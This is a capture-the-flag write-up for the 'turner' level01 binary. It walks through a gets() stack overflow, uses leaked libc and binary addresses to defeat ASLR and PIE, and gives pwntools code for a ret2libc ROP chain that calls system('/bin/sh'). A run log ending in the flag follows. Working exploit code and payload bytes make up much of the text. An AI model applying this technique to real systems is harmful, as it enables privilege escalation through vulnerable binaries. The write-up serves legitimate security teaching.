```sh
level01@override:~$ ls
README  turner  turner.c
level01@override:~$ cat README 
Turner never missed. One shot, one target.
level01@override:~$ ls -la
total 52
drwxr-x---  3 level01 level01  4096 Oct 25 12:24 .
drwxr-xr-x 27 root    root     4096 Jun 10 12:01 ..
-rw-r--r--  1 level01 level01   220 Mar 31  2024 .bash_logout
-rw-r--r--  1 level01 level01  3771 Mar 31  2024 .bashrc
drwx------  2 level01 level01  4096 Oct 25 12:24 .cache
-rw-r--r--  1 level01 level01    30 Jun 10 12:00 .gdbinit
-rw-r--r--  1 level01 level01   807 Mar 31  2024 .profile
-r--r--r--  1 level01 level01    43 Jun 10 12:01 README
-rwsr-x---  1 flag01  level01 14552 Jun 10 12:00 turner
-r--r--r--  1 level01 level01  1916 Jun 10 12:01 turner.c
level01@override:~$ checksec turner
[*] '/home/level01/turner'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
level01@override:~$ file turner
turner: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e98610b9b3ea169cf0228a466e651e5a857d0cc2, for GNU/Linux 3.2.0, strippe

```

Based on this information, we know that our executable has most of its protections active except for the stack canary. This releases us from the burden of finding a way around it, leaving us thinking of a direct ROP chain exploit. But we will still need to have a leaked address.

Lucky for us, based on the `.c` file that was provided, we know that there are two leaked addresses:

```c
static void info_leak(void) {
    printf("[TURNER] brief@binary: %p\n", (void *)default_brief);
    printf("[TURNER] libc_start: %p\n", (void *)exit);
}

```

We get the `default_brief` address, which will help us in case we want to bypass PIE protection, and we have the `exit` address, which helps us bypass ASLR (Address Space Layout Randomization). The main target function for the attack is:

```c
static void acquire_target(void) {
    char profile[TARGET_SIZE];
    info_leak();
    printf("[TURNER] Target: ");
    fflush(stdout);
    gets(profile); // clear buffer overflow, freedom to write directly in the stack with no limits
    for (unsigned int i = 0; i < target_count; i++) {
        if (strncmp(profile, targets[i].codename, PROFILE_SIZE) == 0) {
            targets[i].status = 1;
            printf("[TURNER] Target %u acquired.\n", i);
            targets[i].brief(i);
            return;
        }
    }
    printf("[TURNER] Target not found.\n");
}

```

Looking at this function, we can see clearly that all we need to do is get the leaked address, find the difference between the leaked `exit` address and its static offset in libc, and subtract it to get our actual `libc` base address. And voila! We have valid addresses for our ROP chain attack:

```txt
    Get the leaked address (exit).
    Find the difference between the leaked address and the static libc symbol to calculate the libc base address.
    Use the base address to let pwntools calculate the real addresses in memory.
    Create our payload:
    [b'A'*128 + fake_rbp + ROP_RET + ROP_RDI + ROP_SH + ROP_SYSTEM]

```

```py
# Setup connection
p = connect()
# Receive the leaked data
resp = p.recvuntil(b"[TURNER] Target: ", timeout=TIMEOUT)

# Decode the leaked data and get the leaked address
leaks = resp.decode("utf-8").split('\n')[3].split("[TURNER] libc_start: ")[1]
leaked_libc_exit = int(leaks, 16)

libc_exit = libc.symbols['exit']
libc.address = leaked_libc_exit - libc_exit
system_address = libc.symbols['system']
ROP_SH = next(libc.search(b"/bin/sh"))

rop = ROP(libc)
ROP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
ROP_RET = rop.find_gadget(["ret"])[0]

print("leaked exit: ", hex(leaked_libc_exit), ", exit:", hex(libc_exit), ", libc.address:", hex(libc.address), ", system:", hex(system_address), ", /bin/sh:", hex(ROP_SH), ", ret:", hex(ROP_RET),", pop rdi:", hex(ROP_RDI))

# padding is 136 bytes (128 buffer + 8 fake_rbp) extracted manually
payload = b'A'*128 + p64(0x0) + p64(ROP_RET) + p64(ROP_RDI) + p64(ROP_SH) + p64(system_address) + b'\n'

```

Check our `exploit.py` for the complete view and precise phases. Plus, using the `ROP` and `ELF` instances in pwntools gives us the advantage of not needing to manually search for these gadgets in `/lib/x86_64-linux-gnu/libc.so.6`.

```sh
level01@override:~$ echo "" >  exploit.py  && vim exploit.py  && python3 exploit.py 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process './turner': pid 1655
[*] Loaded 112 cached gadgets for '/lib/x86_64-linux-gnu/libc.so.6'
leaked exit:  0x7bf492c47ba0 , exit: 0x47ba0 , libc.address: 0x7bf492c00000 , system: 0x7bf492c58750 , /bin/sh: 0x7bf492dcc42f , ret: 0x7bf492c28a92 , pop rdi: 0x7bf492d0c08d
[send] b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00\x00\x00\x00\x92\x8a\xc2\x92\xf4{\x00\x00\x8d\xc0\xd0\x92\xf4{\x00\x00/\xc4\xdc\x92\xf4{\x00\x00P\x87\xc5\x92\xf4{\x00\x00\n'
flag{5suzslrbf5mytat7ypad75nqn3ebb9t2}
[*] Process './turner' stopped with exit code -1 (SIG_IGN) (pid 1655)

```

Voila, the result of our exploit!